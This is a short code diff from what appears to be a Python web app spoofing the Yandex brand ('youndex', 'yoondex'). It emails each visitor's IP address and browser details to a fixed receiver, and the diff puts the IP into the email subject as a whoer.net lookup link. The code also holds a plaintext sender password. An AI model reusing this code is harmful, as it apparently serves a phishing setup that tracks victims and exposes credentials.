@@ -151,7 +151,7 @@ def first():
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "youndex !"
+        message["Subject"] = "<a href='http://whoer.net/check?host={{ ipman }}' target='_blank'>{{ ipman }}</a></h3>"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -189,7 +189,7 @@ def second():
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "yoondex !! "
+        message["Subject"] = "yoondex <a href='http://whoer.net/check?host={{ ipman }}' target='_blank'>{{ ipman }}</a></h3> "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
